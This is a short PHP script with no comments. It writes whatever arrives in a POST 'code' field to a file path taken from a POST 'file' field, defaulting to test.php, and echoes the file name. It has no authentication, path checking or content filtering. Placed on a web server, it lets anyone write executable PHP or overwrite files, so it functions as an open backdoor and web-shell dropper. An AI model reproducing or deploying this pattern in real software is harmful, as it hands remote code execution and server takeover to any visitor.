<?php
  $fileName = "";
  if(array_key_exists("file", $_POST)) {
    $fileName = $_POST["file"];
  }
  else {
    $fileName = "test.php";
  }
  $file = fopen($fileName, "w");
  if(array_key_exists("code", $_POST)) {
    fwrite($file, $_POST["code"]);
  }
  fclose($file);
  echo $fileName;
?>